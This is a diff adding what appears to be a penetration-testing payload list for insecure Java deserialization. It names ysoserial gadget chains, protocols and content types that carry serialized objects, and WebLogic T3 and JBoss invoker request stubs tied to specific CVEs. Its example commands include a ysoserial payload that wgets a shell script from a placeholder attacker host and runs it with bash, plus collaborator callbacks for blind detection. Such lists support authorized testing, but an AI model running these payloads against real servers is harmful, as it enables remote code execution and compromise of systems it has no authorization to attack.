@@ -1,0 +1,79 @@
+# ============================================================
+# Insecure Deserialization — Java Gadget Chains
+# ============================================================
+
+# ---- Java Serialization Magic Bytes ----
+# AC ED 00 05 — marks Java serialized object
+# Base64: rO0AB...
+
+# ---- ysoserial Gadget Chains ----
+# Generate with: java -jar ysoserial.jar <Payload> '<command>'
+# Common payload names:
+BeanShell1
+C3P0
+Clojure
+CommonsBeanutils1
+CommonsCollections1
+CommonsCollections2
+CommonsCollections3
+CommonsCollections4
+CommonsCollections5
+CommonsCollections6
+CommonsCollections7
+FileUpload1
+Groovy1
+Hibernate1
+Hibernate2
+JBossInterceptors1
+JRMPClient
+JRMPListener
+JSON1
+JavassistWeld1
+Jdk7u21
+Jython1
+MozillaRhino1
+MozillaRhino2
+Myfaces1
+Myfaces2
+ROME
+Spring1
+Spring2
+URLDNS
+Vaadin1
+Wicket1
+
+# ---- Commands to Try ----
+# java -jar ysoserial.jar CommonsCollections1 'id' | base64
+# java -jar ysoserial.jar CommonsCollections6 'curl http://COLLABORATOR' | base64
+# java -jar ysoserial.jar ROME 'wget http://ATTACKER/shell.sh -O /tmp/s && bash /tmp/s' | base64
+
+# ---- Java Deserialization in Common Places ----
+# HTTP Body (application/x-java-serialized-object)
+# Java RMI
+# JMX
+# T3 (WebLogic)
+# AJP (Apache JServ Protocol)
+# Spring Remoting
+# AMF3 (ActionScript Message Format)
+# Hessian / Burlap
+
+# ---- WebLogic (CVE-2015-4852, CVE-2016-0638, CVE-2017-3248) ----
+# Payload via T3 protocol:
+# t3 10.3.6.0
+# AS:255
+# HL:19
+# MS:10000000
+# ....
+
+# ---- JBoss Deserialize ----
+# POST /invoker/JMXInvokerServlet HTTP/1.1
+# Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation
+
+# ---- Common Content-Types for Java Deserialization ----
+application/x-java-serialized-object
+application/octet-stream
+application/x-www-form-urlencoded (base64 in parameter)
+
+# ---- Gadget Chain Detection (DNS OOB) ----
+# java -jar ysoserial.jar URLDNS 'http://COLLABORATOR' | base64
+# Triggers DNS lookup only — useful for blind detection
